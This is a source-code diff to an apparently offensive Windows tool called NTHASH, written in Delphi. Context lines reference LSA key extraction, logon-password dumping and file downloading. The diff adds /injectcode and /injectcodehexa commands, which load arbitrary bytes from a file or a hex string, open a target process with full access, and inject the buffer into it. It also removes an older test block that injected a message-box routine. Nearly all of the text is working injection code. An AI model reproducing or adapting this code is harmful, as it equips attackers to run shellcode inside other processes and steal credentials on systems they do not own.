@@ -1357,7 +1357,8 @@ begin
   //**************************************
   log('NTHASH /injectmod /pid:12345 /binary:x:\folder\bin.dll',1);
   log('NTHASH /ejectmod /pid:12345 /binary:bin.dll',1);
-  //**************************************
+  log('NTHASH /injectcode /pid:12345 /binary:x:\folder\buffer.bin',1);
+  log('NTHASH /injectcodehexa /pid:12345 /input:hexastring',1);
   //**************************************
   log('NTHASH /download2file /input:url /binary:x:\folder\bin.dll',1);
   log('NTHASH /download2hexa /input:url',1);
@@ -1687,16 +1688,6 @@ if p>0 then
       else log('findlsakeys failed',1);
    //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
 
-   goto fin;
-   end;
-p:=pos('/test',cmdline);
-if p>0 then
-   begin
-   ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
-   if InjectRTL_CODE (ProcessHandle ,@msgbox,nil)
-                                                then log('InjectRTL_CODE OK',0)
-                                                else log('InjectRTL_CODE NOK',0);
-   if ProcessHandle <>thandle(-1) then closehandle(processhandle);
    goto fin;
    end;
 p:=pos('/mstsc',cmdline);
@@ -2090,6 +2081,66 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
         CloseHandle(ProcessHandle);
         end
         else log('OpenProcess failed',1);
+     goto fin;
+     end;
+  p:=pos('/injectcodehexa',cmdline);
+  if p>0 then
+     begin
+     if input='' then exit;
+     input:=StringReplace (input,',','',[rfReplaceAll]);
+     input:=StringReplace (input,'$','',[rfReplaceAll]);
+     input:=StringReplace (input,' ','',[rfReplaceAll]);
+     input_:=HexaStringToByte2 (input);
+     log('length:'+inttostr(length(input_)));
+     //
+     ProcessHandle:=thandle(-1);
+          ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
+          if ProcessHandle<>thandle(-1) then
+          begin
+               log('injecting...');
+               if InjectRTL_BUFFER (ProcessHandle, input_)=false
+                  then log('InjectRTL_BUFFER failed',1)
+                  else log('InjectRTL_BUFFER ok',1);
+               if ProcessHandle <>thandle(-1) then closehandle(processhandle);
+          end
+          else log('OpenProcess failed',1);
+     //
+     goto fin;
+     end;
+  p:=pos('/injectcode',cmdline);
+  if p>0 then
+     begin
+     if binary='' then exit;
+     //
+     inhandle:=thandle(-1);
+     inhandle := CreateFile(pchar(binary), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+     if inhandle=thandle(-1) then goto fin;
+     dw := GetFileSize(inhandle,nil)  ;
+     log('GetFileSize:'+inttostr(dw));
+     ret:=0;setlength(input_,dw);
+     if ReadFile(inhandle,input_[0],dw,ret,nil)=false then log('readfile failed');
+     closehandle(inhandle);
+     log('read bytes:'+inttostr(ret));
+     //
+     ProcessHandle:=thandle(-1);
+     ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
+     if ProcessHandle<>thandle(-1) then
+     begin
+          log('injecting...');
+
+          if InjectRTL_BUFFER (ProcessHandle, input_)=false
+             then log('InjectRTL_BUFFER failed',1)
+             else log('InjectRTL_BUFFER ok',1);
+
+          {
+          if InjectRTL_CODE (ProcessHandle ,@msgbox,nil)
+              then log('InjectRTL_CODE OK',0)
+              else log('InjectRTL_CODE NOK',0);
+          }
+          if ProcessHandle <>thandle(-1) then closehandle(processhandle);
+     end
+     else log('OpenProcess failed',1);
+
      goto fin;
      end;
   //********************************************
